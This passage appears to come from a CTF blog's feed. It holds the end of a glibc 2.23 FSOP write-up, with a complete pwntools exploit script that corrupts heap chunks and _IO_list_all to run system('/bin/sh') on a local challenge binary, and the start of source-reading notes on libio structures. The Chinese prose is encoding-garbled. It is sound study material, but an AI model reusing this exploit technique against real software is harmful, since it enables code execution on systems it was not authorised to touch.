fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_baseè‚¯å®šæ»¡è¶³ï¼Œfp-&gt;_mode &gt; 0æœ‰æ»¡è¶³çš„å¯èƒ½æ€§ï¼ˆä¸çŸ¥é“ä¸ºä»€ä¹ˆå®æµ‹æ²¡æœ‰åˆ¤æ–­IO_vtable_offset (fp) &#x3D;&#x3D; 0ï¼‰ï¼Œéœ€è¦çˆ†ç ´<br>å¸ƒç½®åœ¨heapä¸­çš„fake _IO_FILE_plusæ—¶è¦ä¿è¯fp-&gt;_mode&lt;&#x3D;0ï¼ˆexpä¸­è®¾ä¸º-1ï¼‰ï¼Œfp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_baseï¼ˆexpä¸­åˆ†åˆ«è®¾ä¸º1å’Œ0ï¼‰å¹¶è®¾ç½®vtableæŒ‡é’ˆï¼Œå¼€å¤´å†™â€™&#x2F;bin&#x2F;shâ€™<img src="/2023/02/20/FSOP/IO_FILE.png" class title="IO_FILE">è®¾ç½®è·³è½¬è¡¨<img src="/2023/02/20/FSOP/vtable.png" class title="vtable">è¿™æ ·æ‰§è¡Œ_IO_OVERFLOW (fp, EOF)çš„æ—¶å€™å®é™…æ‰§è¡Œçš„å°±æ˜¯system(â€˜&#x2F;bin&#x2F;shâ€™)</li></ul><h4 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h4><p>ç”¨2.23-0ubuntu3_amd64ç‰ˆæœ¬çš„libcæ—¶ç¨‹åºä¼šæ–­åœ¨è¿›å…¥abortå‡½æ•°ä¹‹å‰ï¼Œè°ƒç”¨æ ˆå¦‚ä¸‹ï¼š</p><img src="/2023/02/20/FSOP/bt.png" class title="bt"><p>ä¸­æ–­åŸå› æ˜¯å°è¯•å†™å…¥ä¸å¯å†™æ®µ</p><img src="/2023/02/20/FSOP/vmmap.png" class title="vmmap"><p>ç”¨2.23-0ubuntu11.3_amd64å°±æ²¡é—®é¢˜<br>æ¢ç¨‹åºæ¢è§¦å‘é”™è¯¯æ–¹å¼éƒ½ä¼šæœ‰åŒæ ·çš„é—®é¢˜ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;input the size:&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;input the content:&#x27;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bye</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">b&#x27;6&#x27;</span>)<br><br>p=process(<span class="hljs-string">&#x27;./note&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)<br>new(<span class="hljs-number">0x200000</span>)<span class="hljs-comment">#libcbase</span><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>libcbase=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].decode(),<span class="hljs-number">16</span>)+<span class="hljs-number">0x201000</span>-<span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>delete()<br>new(<span class="hljs-number">0x200</span>)<span class="hljs-comment">#change the size of topchunk</span><br>edit(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x10df1</span>))<br>delete()<br>new(<span class="hljs-number">0x12000</span>)<span class="hljs-comment">#free topchunk(0x10fe0)</span><br>delete()<br><br>unsorted_bin=libcbase+<span class="hljs-number">0x68</span>+libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>_IO_list_all=libcbase+libc.symbols[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>system=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>new(<span class="hljs-number">0x200</span>)<span class="hljs-comment">#0x10dd0</span><br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x10dd1</span>)+p64(unsorted_bin)*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10db0</span>+p64(<span class="hljs-number">0x10dd0</span>)+p64(<span class="hljs-number">0x11</span>)<br>edit(payload)<br><br>delete()<br>new(<span class="hljs-number">0x10d60</span>)<br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10d60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x61</span>)+p64(unsorted_bin)*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x40</span>+p64(<span class="hljs-number">0x60</span>)+p64(<span class="hljs-number">0x11</span>)<br>edit(payload)<br><br>delete()<br>new(<span class="hljs-number">0x200</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>heap=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].decode(),<span class="hljs-number">16</span>)-<span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x10d71</span>)+p64(heap+<span class="hljs-number">0x210</span>)+p64(unsorted_bin)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10d50</span><br>payload+=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0x61</span>)+p64(unsorted_bin)+p64(_IO_list_all-<span class="hljs-number">0x10</span>)<br>payload+=p64(<span class="hljs-number">0</span>)<span class="hljs-comment">#write base</span><br>payload+=p64(<span class="hljs-number">1</span>)<span class="hljs-comment">#write ptr</span><br>payload+=<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0xc0</span>-<span class="hljs-number">48</span>)<br>payload+=p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>payload+=<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0xd8</span>-<span class="hljs-number">8</span>-<span class="hljs-number">0xc0</span>)<br>payload+=p64(heap+<span class="hljs-number">0x11060</span>)<br>payload+=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>payload+=p64(<span class="hljs-number">1</span>)<br>payload+=p64(system)<br>edit(payload)<br>delete()<br>gdb.attach(p)<br>new(<span class="hljs-number">0xb00</span>)<br>pause()<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>IO</category>
      
    </categories>
    
    
    <tags>
      
      <tag>io</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2.23 IOç›¸å…³æºç é˜…è¯»ç¬”è®°</title>
    <link href="/2023/02/10/IO%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/02/10/IO%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>å¼€å§‹IOå•¦ï¼hgame week4çš„ä¸¤é“IOéƒ½æ‘†çƒ‚æ”¾å¼ƒäº†ï¼Œæ‰“ç®—ä¹‹åå†ç³»ç»Ÿå­¦IOï¼Œhow2heapæš‚æ—¶å‘Šä¸€æ®µè½äº†å°±IOèµ°èµ·<br>psï¼šå…ˆé©¬é©¬è™è™ç¿»ä¸€éï¼Œä»¥åå¦‚æœæœ‰éœ€è¦å†ç»†çœ‹</p><span id="more"></span><h1 id="åŸºæœ¬ç»“æ„ä½“ä¸å…¨å±€å˜é‡"><a href="#åŸºæœ¬ç»“æ„ä½“ä¸å…¨å±€å˜é‡" class="headerlink" title="åŸºæœ¬ç»“æ„ä½“ä¸å…¨å±€å˜é‡"></a>åŸºæœ¬ç»“æ„ä½“ä¸å…¨å±€å˜é‡</h1><h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\libio.h</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br>  <span class="hljs-type">int</span> _flags;<span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_file_flags _flags</span><br><br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  <span class="hljs-type">char</span>* _IO_read_ptr;<span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">char</span>* _IO_read_end;<span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">char</span>* _IO_read_base;<span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_base;<span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_ptr;<span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">char</span>* _IO_write_end;<span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_base;<span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_end;<span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-type">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br><br>  <span class="hljs-type">int</span> _fileno;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>  <span class="hljs-type">int</span> _blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">int</span> _flags2;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_off_t _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __HAVE_COLUMN <span class="hljs-comment">/* temporary */</span></span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br><br>  <span class="hljs-comment">/*  char* _save_gptr;  char* _save_egptr; */</span><br><br>  _IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_complete</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> _<span class="hljs-title">file</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span><br>  _IO_off64_t _offset;<br><span class="hljs-meta"># <span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  <span class="hljs-comment">/* Wide character stream stuff.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *_<span class="hljs-title">codecvt</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> *_<span class="hljs-title">wide_data</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">freeres_list</span>;</span><br>  <span class="hljs-type">void</span> *_freeres_buf;<br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">void</span> *__pad1;<br>  <span class="hljs-type">void</span> *__pad2;<br>  <span class="hljs-type">void</span> *__pad3;<br>  <span class="hljs-type">void</span> *__pad4;<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br>  <span class="hljs-type">size_t</span> __pad5;<br>  <span class="hljs-type">int</span> _mode;<br>  <span class="hljs-comment">/* Make sure we don&#x27;t get into trouble again.  */</span><br>  <span class="hljs-type">char</span> _unused2[<span class="hljs-number">15</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">int</span>) - <span class="hljs-number">4</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">void</span> *) - <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">size_t</span>)];<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><p>é‡è¦æˆå‘˜ï¼š</p><ul><li>_flagsï¼šé«˜ä½å­—ä¸ºIO_MAGICï¼Œå‰©ä½™çš„éƒ¨åˆ†æ˜¯flag</li><li>_IO_read_ptrï¼šinputæŒ‡é’ˆç°åœ¨çš„ä½ç½®</li><li>_IO_read_endï¼šinputç¼“å†²åŒºçš„ç»“æŸåœ°å€</li><li>_IO_read_baseï¼šinputç¼“å†²åŒºçš„åŸºå€</li><li>_IO_write_baseï¼šoutputç¼“å†²åŒºçš„åŸºå€</li><li>_IO_write_ptrï¼šoutputæŒ‡é’ˆç°åœ¨çš„ä½ç½®</li><li>_IO_write_endï¼šoutputæŒ‡é’ˆçš„ç»“æŸåœ°å€</li><li>_IO_buf_baseï¼šç¼“å†²åŒºåŸºå€</li><li>_IO_buf_endï¼šç¼“å†²åŒºç»“æŸåœ°å€</li><li>_chainï¼šç›¸å½“äºfdæŒ‡é’ˆï¼Œç”¨äºå½¢æˆå•é“¾è¡¨ä¸²è”æ‰€æœ‰çš„file stream</li><li>_filenoï¼šä¸æ–‡ä»¶ç›¸å…³çš„æ–‡ä»¶æè¿°ç¬¦</li><li>_vtable_offsetï¼šå­˜æ”¾è™šè¡¨ï¼ˆvirtual tableï¼‰çš„åç§»</li><li>_offsetï¼šå­˜æ”¾å½“å‰æ–‡ä»¶çš„åç§»<br>psï¼šåœ¨çœ‹fopenæºç æ—¶æ³¨æ„åˆ°æœ‰çš„æˆå‘˜ä¸å±äº_IO_FILEè€Œå±äº_IO_FILE_completeï¼Œæ ¹æ®å®å®šä¹‰#ifdef _IO_USE_OLD_IO_FILEï¼Œå¦‚æœæ²¡æœ‰å®šä¹‰_IO_USE_OLD_IO_FILEï¼Œé‚£ä¹ˆ_IO_FILE_completeä¹‹åçš„æˆå‘˜æ˜¯å±äº_IO_FILEçš„ï¼ˆåº”è¯¥æ˜¯ä¸ºäº†å…¼å®¹æ€§è€ƒè™‘ï¼‰</li></ul><h2 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="_IO_FILE_plus"></a>_IO_FILE_plus</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\libioP.h</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>  _IO_FILE file;<br>  <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>æˆå‘˜åç§»ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">amd64ï¼š<br> <br><span class="hljs-number">0x0</span>:<span class="hljs-string">&#x27;_flags&#x27;</span>,<br><span class="hljs-number">0x8</span>:<span class="hljs-string">&#x27;_IO_read_ptr&#x27;</span>,<br><span class="hljs-number">0x10</span>:<span class="hljs-string">&#x27;_IO_read_end&#x27;</span>,<br><span class="hljs-number">0x18</span>:<span class="hljs-string">&#x27;_IO_read_base&#x27;</span>,<br><span class="hljs-number">0x20</span>:<span class="hljs-string">&#x27;_IO_write_base&#x27;</span>,<br><span class="hljs-number">0x28</span>:<span class="hljs-string">&#x27;_IO_write_ptr&#x27;</span>,<br><span class="hljs-number">0x30</span>:<span class="hljs-string">&#x27;_IO_write_end&#x27;</span>,<br><span class="hljs-number">0x38</span>:<span class="hljs-string">&#x27;_IO_buf_base&#x27;</span>,<br><span class="hljs-number">0x40</span>:<span class="hljs-string">&#x27;_IO_buf_end&#x27;</span>,<br><span class="hljs-number">0x48</span>:<span class="hljs-string">&#x27;_IO_save_base&#x27;</span>,<br><span class="hljs-number">0x50</span>:<span class="hljs-string">&#x27;_IO_backup_base&#x27;</span>,<br><span class="hljs-number">0x58</span>:<span class="hljs-string">&#x27;_IO_save_end&#x27;</span>,<br><span class="hljs-number">0x60</span>:<span class="hljs-string">&#x27;_markers&#x27;</span>,<br><span class="hljs-number">0x68</span>:<span class="hljs-string">&#x27;_chain&#x27;</span>,<br><span class="hljs-number">0x70</span>:<span class="hljs-string">&#x27;_fileno&#x27;</span>,<br><span class="hljs-number">0x74</span>:<span class="hljs-string">&#x27;_flags2&#x27;</span>,<br><span class="hljs-number">0x78</span>:<span class="hljs-string">&#x27;_old_offset&#x27;</span>,<br><span class="hljs-number">0x80</span>:<span class="hljs-string">&#x27;_cur_column&#x27;</span>,<br><span class="hljs-number">0x82</span>:<span class="hljs-string">&#x27;_vtable_offset&#x27;</span>,<br><span class="hljs-number">0x83</span>:<span class="hljs-string">&#x27;_shortbuf&#x27;</span>,<br><span class="hljs-number">0x88</span>:<span class="hljs-string">&#x27;_lock&#x27;</span>,<br><span class="hljs-number">0x90</span>:<span class="hljs-string">&#x27;_offset&#x27;</span>,<br><span class="hljs-number">0x98</span>:<span class="hljs-string">&#x27;_codecvt&#x27;</span>,<br><span class="hljs-number">0xa0</span>:<span class="hljs-string">&#x27;_wide_data&#x27;</span>,<br><span class="hljs-number">0xa8</span>:<span class="hljs-string">&#x27;_freeres_list&#x27;</span>,<br><span class="hljs-number">0xb0</span>:<span class="hljs-string">&#x27;_freeres_buf&#x27;</span>,<br><span class="hljs-number">0xb8</span>:<span class="hljs-string">&#x27;__pad5&#x27;</span>,<br><span class="hljs-number">0xc0</span>:<span class="hljs-string">&#x27;_mode&#x27;</span>,<br><span class="hljs-number">0xc4</span>:<span class="hljs-string">&#x27;_unused2&#x27;</span>,<br><span class="hljs-number">0xd8</span>:<span class="hljs-string">&#x27;vtable&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="IO-jump-t"><a href="#IO-jump-t" class="headerlink" title="_IO_jump_t"></a>_IO_jump_t</h2><p>_IO_FILE_pluså‰ä¸€éƒ¨åˆ†æ˜¯_IO_FILEç»“æ„ä½“ï¼Œåä¸€éƒ¨åˆ†å°±æ˜¯æŒ‡å‘_IO_jump_tç»“æ„ä½“çš„vtableæŒ‡é’ˆï¼Œå…¶å®å°±æ˜¯è™šè¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\libioP.h</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">&#123;</span><br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy);<br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow);<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    <span class="hljs-comment">/* showmany */</span><br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, __seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>    get_column;<br>    set_column;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="IO-wide-data"><a href="#IO-wide-data" class="headerlink" title="_IO_wide_data"></a>_IO_wide_data</h2><p>ä¸ºæ•°æ®è¾ƒå¤šçš„æµè®¾ç½®ï¼Œæ ¹æ®å®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br></code></pre></td></tr></table></figure><p>åˆ¤æ–­æ˜¯å¦å¯ç”¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">wchar_t</span> *_IO_read_ptr;<span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">wchar_t</span> *_IO_read_end;<span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">wchar_t</span> *_IO_read_base;<span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">wchar_t</span> *_IO_write_base;<span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">wchar_t</span> *_IO_write_ptr;<span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">wchar_t</span> *_IO_write_end;<span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">wchar_t</span> *_IO_buf_base;<span class="hljs-comment">/* Start of reserve area. */</span><br>  <span 